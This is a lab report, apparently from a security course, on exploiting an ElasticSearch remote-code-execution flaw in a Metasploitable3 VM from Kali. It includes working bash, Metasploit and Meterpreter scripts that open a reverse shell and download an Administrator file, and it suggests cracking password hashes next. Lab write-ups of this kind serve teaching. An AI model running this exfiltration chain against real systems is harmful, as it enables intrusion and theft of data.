# Cybersecurity
## Cybersecurity demo - ElasticSearch exploit

### Summary

[Introduction](#Introduction)<br>
[Threat model](#Threat-model)<br>
[Setup](#Setup)<br>
[Execution](#Execution)<br>
[Results](#Results)<br>
[Conclusions](#Conclusions)<br>
[Further developments](#Further-developments)<br>
[Sources](#Sources)
<br>
<br>
### Introduction

This report describes the exploitation of an ElasticSearch [[1]](#Sources)
vulnerability present on a victim's machine using an attacking machine able to execute the exploit.
<br>
<br>
### Threat model

The threat model entails an attacker already inside the private network of the victim and able to establish a connection to
the victim's machine. As an hypothesis, the attacker is interested in downloading the contents of a file managed by the
victim's machine Administrator; disruption of operation is not paramount in this threat model, as the attacker is envisioned
as trying to acquire proprietary knowledge without alerting the legitimate owner in order to sell it to a potential buyer.
<br>
<br>
### Setup

metasploitable3-workspace_win2k8_1742132564644_45096 [[2]](#Sources) Virtual Machine (VM) as the victim's machine.

kali-linux-2024.4-virtualbox-amd64 [[3]](#Sources) VM as the attacker's machine.

The attacker's machine is tasked with automatically running a series of scripts containing all the information
necessary to exfiltrate the file from the victim's machine; the attack uses ```exploit/multi/elasticsearch/script_mvel_rce``` [[4]](#Sources)
to gain access to the victim's machine file system.
<br>
<br>
### Execution

The victim machine is on during the execution of the exploit with user 'vagrant' as the authenticated user.

All files involved in the execution of the exploit are made executable by other processes with ```chmod +rx <name>.<extension>```

The attacker launches the ```exfiltration.sh``` bash script from the ```/home/kali``` directory of the attacker's machine.

```
# exfiltration.sh

#!/bin/bash

cd ~
msfconsole -q -r ./exfiltration.rc
```

```exfiltration.sh``` is tasked with launching msfconsole with ```exfiltration.rc``` as the resource file to be loaded at startup.


```
# exfiltration.rc

use exploit/multi/elasticsearch/script_mvel_rce
set rhosts 10.0.2.15
set AutoRunScript ./meterpreter_exploit.rc
run
exit
```

```exfiltration.rc``` is tasked with feeding msf6 console with the exploit setup and the victim machine private IPv4 address;
it then sets a third file, ```meterpreter_exploit.rc``` as an automated list of commands to be executed at the establisment of
a reverse TCP shell.

```
# meterpreter_exploit.rc

cd ..
cd ..
cd Users
cd Administrator
download important.txt
```

```meterpreter_exploit.rc``` contains the instructions to access the Administrator's directory and download the ```important.txt```
file.

The attacker can then perform further actions; when satisfied, the connection is closed by entering ```quit``` in the meterpreter
terminal. Finally, the execution completes with the final ```exit``` instruction present in ```exfiltration.rc```.
<br>
<br>
### Results

At the end of execution, the file ```important.txt``` is successfully downloaded to the attacker's machine inside the
```/home/kali``` directory.
<br>
<br>
### Conclusions

This experiment has proven that a vulnerability allowing for Remote Code Execution (RCE) in textual input is sufficient
to gain control of the victim's machine. 
<br>
<br>
### Further developments

This demo can be further expanded by allowing for a dynamic choice of the victim's machine and the execution of a more powerful
exploit to gain access to the Administrator's hashed password, using an instrument like John the Ripper [[5]](#Sources) to infere the password
from the hash and gain access to the Administrator's account.
<br>
<br>
### Sources

[1] https://it.wikipedia.org/wiki/Elasticsearch

[2] https://github.com/rapid7/metasploitable3

[3] https://www.kali.org/docs/virtualization/import-premade-virtualbox/

[4] https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/elasticsearch/script_mvel_rce.rb

[5] https://www.openwall.com/john/
